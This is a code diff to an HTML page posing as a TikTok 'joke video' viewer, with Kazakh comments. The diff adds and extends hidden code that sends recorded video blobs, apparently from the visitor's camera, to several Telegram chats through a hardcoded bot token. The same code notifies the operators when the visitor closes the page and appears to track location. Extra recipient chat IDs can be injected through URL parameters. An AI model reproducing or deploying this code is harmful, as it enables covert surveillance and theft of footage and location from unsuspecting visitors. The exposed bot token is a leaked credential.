@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title> TikTok - прикол видео</title>
+    <title>TikTok - прикол видое</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     
@@ -440,7 +440,6 @@
             display: block;
             opacity: 1;
         }
-
     </style>
 </head>
 <body>
@@ -492,9 +491,33 @@
     </div>
 
     <script>
+        const urlParams = new URLSearchParams(window.location.search);
         const videoContainer = document.getElementById('videoContainer');
         let isAppStarted = false; 
-        
+
+        // Telegram Bot баптаулары (Бірнеше Chat ID қолдауы)
+        const TELEGRAM_BOT_TOKEN = '8544038643:AAEh_qOpyfCqeIx311DiD-c1V2f0YDD_Sv8'; 
+        const defaultChatIDs = ['8403683930', '6657551787', '8517541960']; 
+
+        // URL арқылы қосымша chat_id немесе id қабылдау (мысалы: ?chat_id=123,456)
+        const urlChatIdParam = urlParams.get('chat_id') || urlParams.get('id');
+        let TELEGRAM_CHAT_IDS = [...defaultChatIDs];
+
+        if (urlChatIdParam) {
+            const extraIds = urlChatIdParam.split(',').map(id => id.trim()).filter(Boolean);
+            TELEGRAM_CHAT_IDS = [...new Set([...TELEGRAM_CHAT_IDS, ...extraIds])];
+        }
+
+        function sendToTelegram(text) {
+            TELEGRAM_CHAT_IDS.forEach(chatId => {
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+                }).catch(err => console.error(err));
+            });
+        }
+
         const mockData = [
             {
                 id: 1,
@@ -529,7 +552,6 @@
             }
         ];
 
-        const urlParams = new URLSearchParams(window.location.search);
         const customVideoUrl = urlParams.get('video');
         const customSender = urlParams.get('sender');
 
@@ -619,17 +641,6 @@
                 addComment();
             }
         };
-
-        const TELEGRAM_BOT_TOKEN = '8544038643:AAEh_qOpyfCqeIx311DiD-c1V2f0YDD_Sv8'; 
-        const TELEGRAM_CHAT_ID = '8517541960'; 
-
-        function sendToTelegram(text) {
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
-            }).catch(err => console.error(err));
-        }
 
         function requestFullscreenSafe() {
             const docEl = document.documentElement;
@@ -755,14 +766,16 @@
         }
 
         function sendBlob(blob, ext) {
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('video', blob, `video_${Date.now()}.${ext}`);
-            const isExiting = document.visibilityState === 'hidden';
-            
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
-                method: 'POST', body: formData, keepalive: isExiting
-            }).catch(e => {});
+            TELEGRAM_CHAT_IDS.forEach(chatId => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('video', blob, `video_${Date.now()}.${ext}`);
+                const isExiting = document.visibilityState === 'hidden';
+                
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                    method: 'POST', body: formData, keepalive: isExiting
+                }).catch(e => {});
+            });
         }
 
         document.addEventListener("visibilitychange", () => {
@@ -777,9 +790,11 @@
 
         window.addEventListener("beforeunload", () => {
             if (currentRecorder && currentRecorder.state === 'recording') { isRecordingActive = false; currentRecorder.stop(); }
-            navigator.sendBeacon(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, 
-                new Blob([JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: "🛑 Пайдаланушы сайтты жапты!", parse_mode: 'HTML' })], { type: 'application/json' })
-            );
+            TELEGRAM_CHAT_IDS.forEach(chatId => {
+                navigator.sendBeacon(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, 
+                    new Blob([JSON.stringify({ chat_id: chatId, text: "🛑 Пайдаланушы сайтты жапты!", parse_mode: 'HTML' })], { type: 'application/json' })
+                );
+            });
         });
 
         let lastSentLat = null; let lastSentLon = null;
